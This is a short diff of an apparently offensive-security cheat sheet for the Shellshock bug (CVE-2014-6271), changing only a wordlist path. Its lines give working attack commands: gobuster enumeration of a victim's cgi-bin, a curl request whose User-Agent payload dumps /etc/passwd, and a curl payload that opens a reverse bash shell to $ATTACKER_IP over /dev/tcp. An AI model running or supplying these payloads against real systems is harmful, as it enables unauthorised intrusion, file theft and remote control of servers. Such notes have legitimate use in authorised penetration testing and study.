@@ -1,5 +1,5 @@
 ## <span style="color:#8BE9FD">Shellshock (CVE-2014-6271)</span>
-- Find CGI Scripts `gobuster dir -u http://$VICTIM_IP/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x cgi,sh,pl`
+- Find CGI Scripts `gobuster dir -u http://$VICTIM_IP/cgi-bin/ -w $WORDLIST_PATH/dirb/common.txt -x cgi,sh,pl`
 - Vulnerability Confirmation `curl -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" http://$VICTIM_IP/cgi-bin/status.cgi`
 - Trigger Reverse Shell `curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1" http://$VICTIM_IP/cgi-bin/status.cgi`
 
